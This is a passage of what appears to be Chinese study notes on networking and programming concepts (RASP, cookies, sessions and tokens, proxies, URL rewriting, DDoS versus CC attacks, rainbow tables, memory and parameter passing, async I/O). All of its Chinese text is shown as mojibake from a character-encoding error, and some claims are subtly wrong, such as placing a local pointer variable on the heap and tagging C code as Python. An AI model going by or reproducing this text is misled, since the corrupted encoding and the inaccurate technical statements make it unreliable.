self-protection</code>ï¼Œç®€ç§°<code>RASP</code>ï¼‰RASPé‡‡ç”¨<code>åŸºäºæ”»å‡»è¡Œä¸ºåˆ†æ</code>çš„<code>ä¸»åŠ¨é˜²å¾¡</code>æœºåˆ¶ï¼Œä¸¥é˜²<code>æ–‡ä»¶è¯»å†™</code>ã€<code>æ•°æ®è®¿é—®</code>ã€<code>å‘½ä»¤æ‰§è¡Œ</code>ç­‰Webåº”ç”¨ç³»ç»Ÿå‘½è„‰ï¼ˆåœ¨Webåº”ç”¨ç¨‹åºæ‰§è¡Œå…³é”®çš„Java APIä¹‹å‰æ’å…¥é˜²å¾¡é€»è¾‘ï¼ˆAPI HOOKï¼‰ï¼Œä»è€Œæ§åˆ¶åŸç±»æ–¹æ³•æ‰§è¡Œçš„ä¸šåŠ¡é€»è¾‘ï¼‰</td></tr><tr><td align="center">è·¯ç”±å™¨</td><td align="center">è·¯ç”±å™¨ï¼ˆRouterï¼‰æ˜¯ä¸€ç§ç½‘ç»œè®¾å¤‡ï¼Œç”¨äºå°†æ•°æ®åŒ…ä»ä¸€ä¸ªç½‘ç»œè½¬å‘åˆ°å¦ä¸€ä¸ªç½‘ç»œã€‚ä¸»è¦åŠŸèƒ½<strong>æ ¹æ®ç½‘ç»œåè®®å†³å®šæœ€ä½³çš„è·¯å¾„</strong>æ¥è½¬å‘æ•°æ®ï¼Œ<strong>ç½‘ç»œåœ°å€è½¬æ¢ï¼ˆNATï¼‰</strong></td></tr><tr><td align="center">äº¤æ¢æœº</td><td align="center">äº¤æ¢æœºæ˜¯ä¸€ç§ç½‘ç»œè®¾å¤‡ï¼Œç”¨äºåœ¨å±€åŸŸç½‘ä¸­ä¼ è¾“æ•°æ®åŒ…ã€‚å®ƒæœ‰å¤šä¸ªç«¯å£ï¼Œå¯ä»¥è¿æ¥å¤šå°è®¡ç®—æœºæˆ–å…¶ä»–ç½‘ç»œè®¾å¤‡ï¼Œå¦‚æ‰“å°æœºã€æœåŠ¡å™¨ç­‰ã€‚äº¤æ¢æœºèƒ½å¤Ÿæ ¹æ®æ¯ä¸ªæ•°æ®åŒ…çš„ç›®æ ‡åœ°å€ï¼Œå°†å…¶è½¬å‘åˆ°å¯¹åº”çš„ç›®æ ‡è®¾å¤‡ï¼Œå®ç°è®¾å¤‡ä¹‹é—´çš„é€šä¿¡å’Œæ•°æ®ä¼ è¾“ã€‚äº¤æ¢æœºè¿˜å¯ä»¥æä¾›ä¸€äº›é¢å¤–çš„åŠŸèƒ½ï¼Œå¦‚è™šæ‹Ÿå±€åŸŸç½‘ï¼ˆVLANï¼‰åˆ’åˆ†ã€å®‰å…¨ç­–ç•¥é…ç½®ç­‰ã€‚</td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr></tbody></table><h1 id="è •è™«ã€ç—…æ¯’ä¹‹é—´çš„åŒºåˆ«"><a href="#è •è™«ã€ç—…æ¯’ä¹‹é—´çš„åŒºåˆ«" class="headerlink" title="è •è™«ã€ç—…æ¯’ä¹‹é—´çš„åŒºåˆ«"></a>è •è™«ã€ç—…æ¯’ä¹‹é—´çš„åŒºåˆ«</h1><p><img src="/../images/image-20230518203842099.png" alt="image-20230518203842099"></p><h1 id="token-x2F-cookie-x2F-session"><a href="#token-x2F-cookie-x2F-session" class="headerlink" title="token&#x2F;cookie&#x2F;session"></a>token&#x2F;cookie&#x2F;session</h1><p><a href="https://www.bilibili.com/video/BV1ob4y1Y7Ep">https://www.bilibili.com/video/BV1ob4y1Y7Ep</a></p><ol><li><p>cookie</p><ul><li><p>äº§ç”Ÿçš„åŸå› </p><p>å› ä¸ºhttpæ˜¯æ— çŠ¶æ€åè®®ï¼Œå‡è®¾æˆ‘ä»¥khazçš„èº«ä»½å»è®¿é—®æœåŠ¡å™¨ï¼Œç­‰åˆ°ä¸‹ä¸€æ¬¡æˆ‘å†æ¬¡è®¿é—®æœåŠ¡å™¨æ—¶ï¼ŒæœåŠ¡å™¨è¿˜æ˜¯ä¸çŸ¥é“æˆ‘æ˜¯è°ï¼Œæˆ‘ä»éœ€è¦å‘æœåŠ¡å™¨æäº¤æ•°æ®è¯´æ˜æˆ‘æ˜¯khazã€‚è¿™æ ·å°±å¯¼è‡´äº†åœ¨åŒä¸€ä¸ªç½‘ç«™ä¸‹æˆ‘æ¯æ¬¡è®¿é—®ä¸€ä¸ªæœåŠ¡éƒ½éœ€è¦æäº¤ä¸€æ¬¡æ•°æ®ï¼Œå¾ˆéº»çƒ¦ã€‚</p></li><li><p>æœ¬è´¨</p><p>æµè§ˆå™¨å­˜å‚¨æŠ€æœ¯ï¼Œå®ç°æ¯æ¬¡HTTPè¯·æ±‚éƒ½è‡ªåŠ¨æäº¤æ•°æ®ç»™æœåŠ¡å™¨çš„æŠ€æœ¯ã€‚</p></li><li><p>æœºåˆ¶</p><p>å½“ç”¨æˆ·ç¬¬ä¸€æ¬¡ç™»å½•åï¼ŒæœåŠ¡å™¨è¿”å›çš„responseä¸­ä¼šæœ‰ä¸€ä¸ªset-cookieå­—æ®µï¼Œå½“æˆ‘ä»¬çš„æµè§ˆå™¨æ¥æ”¶åˆ°responseåï¼Œå°±ä¼šå°†set-cookieä¸­çš„å€¼ä¿å­˜åˆ°cookieä¸­ï¼Œç„¶åæ¯æ¬¡æˆ‘ä»¬ç™»é™†æ—¶æµè§ˆå™¨å°±ä¼šè‡ªåŠ¨åœ¨è¯·æ±‚ä¸­ä¸ºæˆ‘ä»¬å¸¦ä¸Šcookieï¼ŒæœåŠ¡ç«¯æ¥æ”¶åå»æ•°æ®åº“ä¸­æ ¸å®cookieä¿¡æ¯ã€‚</p></li><li><p>å®ä¾‹</p><p>é€šå¸¸ï¼Œæˆ‘ä»¬å¯ä»¥ä»å¾ˆå¤šç½‘ç«™çš„ç™»å½•ç•Œé¢ä¸­çœ‹åˆ°â€œè¯·è®°ä½æˆ‘â€è¿™æ ·çš„é€‰é¡¹ï¼Œå¦‚æœä½ å‹¾é€‰äº†å®ƒä¹‹åå†ç™»å½•ï¼Œé‚£ä¹ˆåœ¨ä¸‹ä¸€æ¬¡è®¿é—®è¯¥ç½‘ç«™çš„æ—¶å€™å°±ä¸éœ€è¦è¿›è¡Œé‡å¤è€Œç¹ççš„ç™»å½•åŠ¨ä½œäº†ï¼Œè€Œè¿™ä¸ªåŠŸèƒ½å°±æ˜¯é€šè¿‡Cookieå®ç°çš„ã€‚</p></li></ul></li><li><p>session</p><ul><li><p>äº§ç”Ÿçš„åŸå› </p><p>å› ä¸ºcookieæ˜¯ä¿å­˜åœ¨æµè§ˆå™¨ä¸­çš„ï¼Œç”¨æˆ·å¯ä»¥éšæ„æŸ¥çœ‹å’Œä¿®æ”¹å¾ˆä¸å®‰å…¨ã€‚</p></li><li><p>æœ¬è´¨</p><p>ä¸€ç§æ¦‚å¿µã€‚è®©HTTPä»æ— çŠ¶æ€è¿æ¥å˜ä¸ºæœ‰çŠ¶æ€è¿æ¥ï¼ˆä¼šè¯çŠ¶æ€ï¼‰ã€‚</p></li><li><p>æœºåˆ¶</p><p>å½“ç”¨æˆ·ç¬¬ä¸€æ¬¡ç™»å½•åï¼ŒæœåŠ¡ç«¯ä¼šåœ¨å†…å­˜ä¸­ç”Ÿæˆsessionå¯¹è±¡ç”¨äºä¿å­˜ç”¨æˆ·ä¿¡æ¯ï¼ŒåŒæ—¶é€šè¿‡set-cookieå­—æ®µå°†session-idä¿å­˜åˆ°æµè§ˆå™¨ä¸­ã€‚åœ¨ä¼šè¯çš„æœ‰æ•ˆæœŸå†…ï¼Œå®¢æˆ·ç«¯æ¯æ¬¡è¯·æ±‚éƒ½ä¼šå¸¦ä¸Šsession-idï¼ŒæœåŠ¡ç«¯æ ¹æ®session-idæ‰¾åˆ°å¯¹åº”çš„sessionï¼Œæ ¸å®ç”¨æˆ·çš„èº«ä»½ã€‚</p><blockquote><p>æ³¨ï¼šä¼šè¯çš„æœ‰æ•ˆæœŸæ˜¯é€šè¿‡è®¾ç½®cookieçš„æœ‰æ•ˆæœŸå®ç°çš„ã€‚</p></blockquote></li></ul></li><li><p>token</p><ul><li><p>äº§ç”Ÿçš„åŸå› </p><p>å› ä¸ºsessionçš„æœºåˆ¶ï¼ŒæœåŠ¡ç«¯éœ€è¦åœ¨å†…å­˜ä¸­ä¿å­˜sessionï¼Œå°±ä¼šå‡ºç°ä¸€äº›é—®é¢˜ã€‚ä¾‹å¦‚ï¼š</p><ul><li>å¤§é‡sessionå¯¹è±¡çš„å­˜å‚¨å¸¦æ¥çš„å†…å­˜æ¶ˆè€—</li><li>å„æœåŠ¡å™¨ä¹‹é—´sessionçš„å¤åˆ¶</li><li>ä¸“é—¨ç”¨äºå­˜å‚¨sessionçš„æœåŠ¡å™¨å®•æœº</li></ul></li><li><p>æœ¬è´¨</p><p>èº«ä»½ä»¤ç‰Œ</p></li><li><p>æœºåˆ¶</p><p>å½“ç”¨æˆ·ç¬¬ä¸€æ¬¡ç™»é™†åï¼ŒæœåŠ¡ç«¯ä¼šç”Ÿæˆä¸€ä¸ªtokenä»¤ç‰Œã€‚é€šè¿‡ set-cookieå­—æ®µä¿å­˜åˆ°æµè§ˆå™¨ä¸­ã€‚</p><p>åœ¨ä»¤ç‰Œçš„æœ‰æ•ˆæœŸå†…ï¼Œå®¢æˆ·ç«¯æ¯æ¬¡è¯·æ±‚éƒ½ä¼šå¸¦ä¸Štokenä»¤ç‰Œï¼ŒæœåŠ¡ç«¯é€šè¿‡ä¿å­˜çš„å¯†é’¥éªŒè¯ç­¾åæ¥æ ¸å¯¹ç”¨æˆ·èº«ä»½ã€‚</p></li><li><p>å®ä¾‹</p><p> JWTï¼ˆjson web tokenï¼‰</p><p>æ€»ç»“</p><blockquote><p>cookieï¼š</p><p>å®¢æˆ·ç«¯ä¿å­˜ï¼ŒæœåŠ¡ç«¯ä¸ä¿å­˜ã€‚</p><p>sessionï¼š</p><p>å®¢æˆ·ç«¯åªä¿å­˜session-idï¼ŒæœåŠ¡ç«¯ä¿å­˜sessionå¯¹è±¡ã€‚</p><p>tokenï¼š</p><p>å®¢æˆ·ç«¯ä¿å­˜tokenï¼ŒæœåŠ¡ç«¯åªä¿å­˜tokenç­¾åçš„å¯†é’¥ã€‚</p></blockquote></li></ul></li></ol><h1 id="æ­£å‘-x2F-åå‘ä»£ç†"><a href="#æ­£å‘-x2F-åå‘ä»£ç†" class="headerlink" title="æ­£å‘&#x2F;åå‘ä»£ç†"></a>æ­£å‘&#x2F;åå‘ä»£ç†</h1><p><a href="https://www.cloudflare.com/zh-cn/learning/cdn/glossary/reverse-proxy/">https://www.cloudflare.com/zh-cn/learning/cdn/glossary/reverse-proxy/</a></p><ul><li><p>æ­£å‘ä»£ç†</p><blockquote><p>è½¬å‘ä»£ç†ï¼Œé€šå¸¸ç§°ä¸ºä»£ç†ã€ä»£ç†æœåŠ¡å™¨æˆ– Web ä»£ç†ï¼Œæ˜¯ä½äºä¸€ç»„å®¢æˆ·ç«¯è®¡ç®—æœºä¹‹å‰çš„æœåŠ¡å™¨,ç¡®ä¿æ²¡æœ‰æºç«™ç›´æ¥ä¸è¯¥ç‰¹å®šå®¢æˆ·ç«¯é€šä¿¡</p></blockquote><p><img src="/../images/forward-proxy-flow.svg" alt="æ­£å‘ä»£ç†æµ"></p></li></ul><p>â€‹        åœ¨æ ‡å‡†çš„äº’è”ç½‘é€šä¿¡ä¸­ï¼Œè®¡ç®—æœº A å°†ç›´æ¥ä¸è®¡ç®—æœº C ä¿æŒè”ç³»ï¼Œå®¢æˆ·ç«¯å°†è¯·æ±‚å‘é€åˆ°<a href="https://www.cloudflare.com/learning/cdn/glossary/origin-server/">æºæœåŠ¡å™¨</a>ï¼Œå¹¶ä¸”æºæœåŠ¡å™¨å°†å“åº”å®¢æˆ·ç«¯ã€‚å½“å­˜åœ¨æ­£å‘&#x2F;è½¬å‘ä»£ç†æ—¶ï¼ŒA å°†è¯·æ±‚å‘é€åˆ° Bï¼ŒB éšåå°†è¯·æ±‚è½¬å‘ç»™ Cã€‚C å°†å‘ B å‘é€å“åº”ï¼Œè€Œ B åˆ™å°†å“åº”è½¬å‘ç»™ Aã€‚</p><ul><li><p>åå‘ä»£ç†</p><blockquote><p>åå‘ä»£ç†æ˜¯ä½äºä¸€ä¸ªæˆ–å¤šä¸ª Web æœåŠ¡å™¨å‰é¢çš„æœåŠ¡å™¨ï¼Œæ‹¦æˆªæ¥è‡ªå®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œç¡®ä¿æ²¡æœ‰å®¢æˆ·ç«¯ç›´æ¥ä¸è¯¥æºç«™é€šä¿¡ã€‚</p></blockquote><p><img src="/../images/reverse-proxy-flow.svg" alt="åå‘ä»£ç†æµ"></p></li></ul><p>â€‹       é€šå¸¸ï¼Œæ¥è‡ª D çš„æ‰€æœ‰è¯·æ±‚éƒ½å°†ç›´æ¥å‘é€åˆ° Fï¼Œè€Œ F ä¼šç›´æ¥å°†å“åº”å‘é€åˆ° Dã€‚ä½¿ç”¨åå‘ä»£ç†ï¼Œæ¥è‡ª D çš„æ‰€æœ‰è¯·æ±‚éƒ½å°†ç›´æ¥å‘é€ç»™ Eï¼Œè€Œ E ä¼šå°†å…¶è¯·æ±‚å‘é€åˆ° F å¹¶ä» F æ¥æ”¶å“åº”ï¼Œç„¶åå°†é€‚å½“å“åº”ä¼ é€’ç»™ Dã€‚</p><table><thead><tr><th align="left"></th><th>å¯¹è±¡</th><th>ä¼˜ç‚¹</th></tr></thead><tbody><tr><td align="left">æ­£å‘&#x2F;è½¬å‘ä»£ç†</td><td>å®¢æˆ·ç«¯</td><td>åŒ¿åï¼Œç»•è¿‡è®¿é—®é™åˆ¶</td></tr><tr><td align="left">åå‘ä»£ç†</td><td>æœåŠ¡ç«¯</td><td>æ›´åŠ å®‰å…¨ï¼Œæé«˜æœåŠ¡å™¨æ€§èƒ½</td></tr></tbody></table><h1 id="é™æ€webå’ŒåŠ¨æ€web"><a href="#é™æ€webå’ŒåŠ¨æ€web" class="headerlink" title="é™æ€webå’ŒåŠ¨æ€web"></a>é™æ€webå’ŒåŠ¨æ€web</h1><p><a href="https://help.dedecms.com/shiyongshouce/moshi/mingci.html">https://help.dedecms.com/shiyongshouce/moshi/mingci.html</a></p><p>ä¼ªé™æ€å³æ˜¯ç½‘ç«™æœ¬èº«æ˜¯åŠ¨æ€ç½‘é¡µå¦‚.phpã€.aspã€.aspxç­‰æ ¼å¼åŠ¨æ€ç½‘é¡µæœ‰æ—¶è¿™ç±»åŠ¨æ€ç½‘é¡µè¿˜è·Ÿâ€?â€åŠ å‚æ•°æ¥è¯»å–æ•°æ®åº“å†…ä¸åŒèµ„æ–™ï¼Œä¼ªé™æ€å°±æ˜¯åšurlé‡å†™æ“ä½œ(å³rewrite)ã€‚</p><p>demo</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">è·³è½¬éœ€æ±‚ï¼š</span><br><span class="line">è®¿é—®http:<span class="comment">//www.kevin.com/p/123456.html  è·³è½¬æˆ  http://a.aa.com/p/123456</span></span><br><span class="line"></span><br><span class="line">é…ç½®å¦‚ä¸‹:</span><br><span class="line">rewrite ^/p/(\d+).html    http:<span class="comment">//www.kevin.com/p/$1 last;</span></span><br><span class="line"></span><br><span class="line">è§£é‡Šè¯´æ˜ï¼š</span><br><span class="line">\dæ˜¯æ•°å­—çš„æ„æ€ +æ˜¯æœ€å°‘ä¸€ä¸ª&#123;<span class="number">1</span>,&#125; <span class="number">1</span>åˆ°æ— ç©·å¤§&#123;<span class="number">1</span>,<span class="number">3</span>&#125; è¿™æ ·æ˜¯<span class="number">1</span>-<span class="number">3</span>ä½æ•°ã€‚</span><br></pre></td></tr></table></figure><h1 id="DDOSæ”»å‡»å’ŒCCæ”»å‡»"><a href="#DDOSæ”»å‡»å’ŒCCæ”»å‡»" class="headerlink" title="DDOSæ”»å‡»å’ŒCCæ”»å‡»"></a>DDOSæ”»å‡»å’ŒCCæ”»å‡»</h1><p>DDoSæ”»å‡»æ‰“çš„æ˜¯ç½‘ç«™çš„æœåŠ¡å™¨ï¼Œè€ŒCCæ”»å‡»æ˜¯é’ˆå¯¹ç½‘ç«™çš„é¡µé¢æ”»å‡»çš„ã€‚</p><p>ç”¨æœ¯è¯­æ¥è¯´å°±æ˜¯ï¼Œä¸€ä¸ªæ˜¯WEBç½‘ç»œå±‚æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆDDoSï¼‰ï¼Œä¸€ä¸ªæ˜¯WEBåº”ç”¨å±‚æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆCCï¼‰ã€‚</p><p>ç½‘ç»œå±‚å°±æ˜¯åˆ©ç”¨è‚‰é¸¡çš„æµé‡å»æ”»å‡»ç›®æ ‡ç½‘ç«™çš„æœåŠ¡å™¨ï¼Œé’ˆå¯¹æ¯”è¾ƒæœ¬æºçš„ä¸œè¥¿å»æ”»å‡»ï¼ˆé€šä¿¡ä¿¡é“ï¼‰ï¼ŒæœåŠ¡å™¨ç˜«ç—ªäº†ï¼Œé‚£ä¹ˆè¿è¡Œåœ¨æœåŠ¡å™¨ä¸Šçš„ç½‘ç«™è‚¯å®šä¹Ÿä¸èƒ½æ­£å¸¸è®¿é—®äº†ã€‚</p><p>è€Œåº”ç”¨å±‚å°±æ˜¯æˆ‘ä»¬ç”¨æˆ·çœ‹å¾—åˆ°çš„ä¸œè¥¿ï¼Œå°±æ¯”å¦‚è¯´ç½‘é¡µï¼ŒCCæ”»å‡»å°±æ˜¯é’ˆå¯¹ç½‘é¡µæ¥æ”»å‡»çš„ï¼ŒCCæ”»å‡»æœ¬èº«æ˜¯æ­£å¸¸è¯·æ±‚ï¼Œç½‘ç«™åŠ¨æ€é¡µé¢çš„æ­£å¸¸è¯·æ±‚ä¹Ÿä¼šå’Œæ•°æ®åº“è¿›è¡Œäº¤äº’çš„ï¼Œå½“è¿™ç§â€æ­£å¸¸è¯·æ±‚â€è¾¾åˆ°ä¸€ç§ç¨‹åº¦çš„æ—¶å€™ï¼ŒæœåŠ¡å™¨å°±ä¼šå“åº”ä¸è¿‡æ¥ï¼Œä»è€Œå´©æºƒã€‚</p><h1 id="å½©è™¹è¡¨"><a href="#å½©è™¹è¡¨" class="headerlink" title="å½©è™¹è¡¨"></a>å½©è™¹è¡¨</h1><p><a href="https://zhuanlan.zhihu.com/p/105578739">https://zhuanlan.zhihu.com/p/105578739</a></p><p><strong>å½©è™¹è¡¨</strong>(<code>rainbow table</code>)æ˜¯ä¸€ä¸ªç”¨äº<a href="https://link.zhihu.com/?target=https://zh.wikipedia.org/wiki/%E5%8A%A0%E5%AF%86%E6%95%A3%E5%88%97%E5%87%BD%E6%95%B0">åŠ å¯†æ•£åˆ—å‡½æ•°</a>é€†è¿ç®—çš„é¢„å…ˆè®¡ç®—å¥½çš„<a href="https://link.zhihu.com/?target=https://zh.wikipedia.org/wiki/%E6%9F%A5%E6%89%BE%E8%A1%A8">è¡¨</a>ï¼Œå¸¸ç”¨äºç ´è§£åŠ å¯†è¿‡çš„å¯†ç æ•£åˆ—ã€‚å¦‚MD5ï¼ŒSHA1.</p><p> æŸ¥æ‰¾è¡¨å¸¸å¸¸ç”¨äºåŒ…å«æœ‰é™å­—ç¬¦å›ºå®šé•¿åº¦<a href="https://link.zhihu.com/?target=https://zh.wikipedia.org/wiki/%E7%BA%AF%E6%96%87%E6%9C%AC">çº¯æ–‡æœ¬</a><a href="https://link.zhihu.com/?target=https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A0%81">å¯†ç </a>çš„åŠ å¯†ã€‚</p><p>äº‹å…ˆå‡†å¤‡å¤§é‡å“ˆå¸Œé“¾è¡¨ï¼š</p><p>Xï¼šéšæœºç”Ÿæˆçš„æ˜æ–‡</p><p>Hï¼šå“ˆå¸Œå‡½æ•°</p><p>Rï¼šè‡ªå®šä¹‰å‡½æ•°</p><p><img src="/../images/image-20220622152607746-1686284457479.png" alt="image-20220622152607746"></p><p>åªä¿å­˜å¼€å¤´å’Œæœ«å°¾ä½ç½®å³Xå’ŒRnã€‚</p><p>å¯¹äºç»è¿‡Hå¾—åˆ°çš„å¯†æ–‡Cè¿›è¡Œç ´è§£ï¼šé¦–å…ˆä½¿ç”¨Rå¾—åˆ°Y&#x3D;Rï¼ˆCï¼‰ï¼Œå†å°†Yä¸Rnè¿›è¡Œæ¯”è¾ƒã€‚</p><p>â‘ å¦‚æœç›¸ç­‰ï¼Œåˆ™è¯´æ˜å¯†æ–‡Cå¯¹åº”çš„æ˜æ–‡Påœ¨å“ˆå¸Œé“¾è¡¨ä¸­çš„Rn-1å¤„ã€‚åŸç†è§ä¸‹å›¾ã€‚</p><p><img src="/../images/image-20220622153058176-1686284457479.png" alt="image-20220622153058176"></p><p>â‘¡å¦‚æœä¸ç›¸ç­‰ï¼Œåˆ™è¯´æ˜å¯†æ–‡Cå¯¹åº”çš„æ˜æ–‡Pä¸åœ¨å“ˆå¸Œé“¾è¡¨ä¸­çš„Rn-1å¤„ã€‚æ‰€ä»¥éœ€è¦å‘å‰æŸ¥æ‰¾æ˜¯å¦åœ¨Rn-2~R1å¤„ã€‚</p><p>å…·ä½“æµç¨‹ï¼šå¯¹Yå†ç”¨Hå’ŒRå‡½æ•°ï¼Œå¾—åˆ°Yâ€˜ï¼Œä¸Rnæ¯”è¾ƒï¼Œå¦‚æœç›¸ç­‰ï¼Œåˆ™è¯´æ˜æ˜æ–‡ä¸ºRn-2ï¼Œå¦‚æœä¸æ˜¯ï¼Œå°±é‡å¤æ­¥éª¤ï¼Œç›´åˆ°æ‰€æœ‰å“ˆå¸Œé“¾è¡¨éƒ½æŸ¥æ‰¾è¿‡ï¼Œè¯´æ˜ç ´è§£å¤±è´¥ã€‚</p><p>é˜²å¾¡æ‰‹æ®µï¼šåŠ å¯†æ—¶ä½¿ç”¨ç›å€¼</p><h1 id="å †å’Œæ ˆ"><a href="#å †å’Œæ ˆ" class="headerlink" title="å †å’Œæ ˆ"></a>å †å’Œæ ˆ</h1><p><a href="https://cloud.tencent.com/developer/article/1688327">å †å’Œæ ˆçš„åŒºåˆ«</a></p><blockquote><p>æ ˆåŒºä¿å­˜å£°æ˜çš„å˜é‡ä¾‹å¦‚<code>int a=1</code>,ç”±ç³»ç»Ÿè‡ªåŠ¨åˆ†é…</p><p>å †åŒºä¿å­˜ç”¨æˆ·ç”³è¯·çš„å˜é‡ä¾‹å¦‚<code>malloc</code>ï¼Œ<code>b=&amp;a</code></p><p>ç¨‹åºåœ¨ç¼–è¯‘å˜é‡å’Œå¯¹å‡½æ•°åˆ†é…å†…å­˜éƒ½åœ¨æ ˆä¸Šè¿›è¡Œï¼Œä¸”å‡½æ•°è°ƒç”¨æ—¶å‚æ•°çš„ä¼ é€’ä¹Ÿæ˜¯åœ¨æ ˆä¸Šè¿›è¡Œã€‚</p></blockquote><h1 id="æŒ‰å€¼ä¼ é€’ï¼ŒæŒ‰å¼•ç”¨ä¼ é€’å’ŒæŒ‰æŒ‡é’ˆä¼ é€’"><a href="#æŒ‰å€¼ä¼ é€’ï¼ŒæŒ‰å¼•ç”¨ä¼ é€’å’ŒæŒ‰æŒ‡é’ˆä¼ é€’" class="headerlink" title="æŒ‰å€¼ä¼ é€’ï¼ŒæŒ‰å¼•ç”¨ä¼ é€’å’ŒæŒ‰æŒ‡é’ˆä¼ é€’"></a>æŒ‰å€¼ä¼ é€’ï¼ŒæŒ‰å¼•ç”¨ä¼ é€’å’ŒæŒ‰æŒ‡é’ˆä¼ é€’</h1><p><a href="https://www.junmajinlong.com/coding/pass_by_value_or_ref/">https://www.junmajinlong.com/coding/pass_by_value_or_ref/</a></p><ul><li><p>æŒ‰å€¼ä¼ é€’</p><blockquote><p>å¼€è¾Ÿæ–°ç©ºé—´ï¼Œå°†æ•°æ®å¯¹è±¡æ‹·è´ä¸€ä»½å‰¯æœ¬åˆ°æ–°ç©ºé—´ä¸­</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> a=<span class="number">10</span>;</span><br><span class="line"><span class="built_in">int</span> b=a;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221027160246647-1686284933113.png" alt="image-20221027160246647"></p><blockquote><p>è¿™æ—¶å€™ä¿®æ”¹aæˆ–bçš„å€¼ï¼Œéƒ½ä¸ä¼šå½±å“å¦ä¸€ä¸ªå˜é‡çš„å€¼</p></blockquote></li><li><p>æŒ‰å¼•ç”¨ä¼ é€’</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a=<span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> &amp;b=a;</span><br></pre></td></tr></table></figure><blockquote><p>ä¸å¼€è¾Ÿæ–°ç©ºé—´ï¼Œåªæ˜¯ç»™æ•°æ®å¯¹è±¡æ‰€åœ¨ç©ºé—´åèµ·äº†ä¸€ä¸ªåˆ«å</p></blockquote><p><img src="/../images/image-20221027160357481-1686284933114.png" alt="image-20221027160357481"></p><blockquote><p>è¿™æ—¶å€™ä¿®æ”¹aæˆ–bçš„å€¼ï¼Œåº”è¯¥ä¼šå½±å“å¦ä¸€ä¸ªå˜é‡çš„å€¼ï¼Œå› ä¸ºäºŒè€…çš„åœ°å€æ˜¯ä¸€æ ·çš„ã€‚</p></blockquote></li><li><p>æŒ‰æŒ‡é’ˆä¼ é€’</p><p>åœ¨cæˆ–c++å¯ä»¥æ“ä½œæŒ‡é’ˆçš„è¯­è¨€ä¸­</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a=<span class="number">10</span>;</span><br><span class="line"><span class="type">int</span>* b=&amp;a;</span><br></pre></td></tr></table></figure><blockquote><p>åœ¨å †å†…å­˜ä¸­å¼€è¾Ÿç©ºé—´ç”¨æ¥ä¿å­˜æŒ‡é’ˆbï¼ŒbæŒ‡å‘aæ‰€åœ¨çš„åœ°å€ï¼ˆä¿å­˜açš„åœ°å€ï¼‰ã€‚</p></blockquote><p><img src="/../images/image-20221027160713576-1686284933115.png" alt="image-20221027160713576"></p></li></ul><h1 id="é˜»å¡å’Œéé˜»å¡ï¼ŒåŒæ­¥å’Œå¼‚æ­¥ï¼Œå›è°ƒå‡½æ•°"><a href="#é˜»å¡å’Œéé˜»å¡ï¼ŒåŒæ­¥å’Œå¼‚æ­¥ï¼Œå›è°ƒå‡½æ•°" class="headerlink" title="é˜»å¡å’Œéé˜»å¡ï¼ŒåŒæ­¥å’Œå¼‚æ­¥ï¼Œå›è°ƒå‡½æ•°"></a>é˜»å¡å’Œéé˜»å¡ï¼ŒåŒæ­¥å’Œå¼‚æ­¥ï¼Œå›è°ƒå‡½æ•°</h1><p><strong>ä¾‹å­</strong></p><p>æˆ‘è¦çœ‹è¶³çƒæ¯”èµ›ï¼Œä½†æ˜¯å¦ˆå¦ˆå«æˆ‘çƒ§æ°´ï¼Œç”µè§†æœºåœ¨å®¢å…ï¼Œçƒ§æ°´è¦åœ¨å¨æˆ¿ã€‚å®¶é‡Œæœ‰2ä¸ªæ°´å£¶ï¼Œä¸€ä¸ªæ˜¯æ™®é€šçš„æ°´å£¶ï¼Œå¦ä¸€ä¸ªæ˜¯æ°´å¼€äº†ä¼šå«çš„é‚£ç§æ°´å£¶ã€‚æˆ‘å¯ä»¥ï¼š</p><ol><li>ç”¨æ™®é€šçš„æ°´å£¶çƒ§ï¼Œäººåœ¨è¾¹ä¸Šçœ‹ç€ï¼Œæ°´å¼€äº†å†å»çœ‹çƒã€‚<strong>ï¼ˆåŒæ­¥ï¼Œé˜»å¡ï¼‰</strong>è¿™ä¸ªæ˜¯å¸¸è§„åšæ³•ï¼Œä½†æ˜¯æˆ‘çœ‹çƒä¸çˆ½äº†ã€‚</li><li>ç”¨æ™®é€šæ°´å£¶çƒ§ï¼Œäººå»çœ‹çƒï¼Œéš”å‡ åˆ†é’Ÿå»å¨æˆ¿çœ‹çœ‹ã€‚<strong>ï¼ˆåŒæ­¥ï¼Œéé˜»å¡ï¼‰</strong>è¿™ä¸ªåˆå¤§é—®é¢˜ï¼Œä¸‡ä¸€åœ¨æˆ‘ç¦»å¼€çš„å‡ åˆ†é’Ÿæ°´å¼€äº†ï¼Œæˆ‘å°±éº»çƒ¦äº†ã€‚</li><li>ç”¨ä¼šå«çš„æ°´å£¶ï¼Œäººåœ¨è¾¹ä¸Šçœ‹ç€ã€‚<strong>ï¼ˆå¼‚æ­¥ï¼Œé˜»å¡ï¼‰</strong>è¿™ä¸ªæ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯æˆ‘å¤ªå‚»äº†ã€‚</li><li>ç”¨ä¼šå«çš„æ°´å£¶ï¼Œäººå»çœ‹çƒï¼Œå¬è§æ°´å£¶å«äº†å†å»çœ‹ã€‚<strong>ï¼ˆå¼‚æ­¥ï¼Œéé˜»å¡ï¼‰</strong>è¿™ä¸ªåº”è¯¥æ˜¯æœ€å¥½çš„ã€‚</li></ol><p>ç­‰ç€çœ‹çƒçš„æˆ‘ï¼šé˜»å¡</p><p>çœ‹ç€ç”µè§†çš„æˆ‘ï¼šéé˜»å¡</p><p>æ™®é€šæ°´å£¶ï¼šåŒæ­¥</p><p>ä¼šå«çš„æ°´å£¶ï¼šå¼‚æ­¥</p><p>æ‰€ä»¥ï¼Œå¼‚æ­¥å¾€å¾€é…åˆéé˜»å¡ï¼Œæ‰èƒ½å‘æŒ¥å‡ºå¨åŠ›ã€‚</p><p><strong>å›è°ƒå‡½æ•°</strong></p><p>åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œç”¨ä¼šå«çš„æ°´å£¶ï¼Œäººå»çœ‹çƒï¼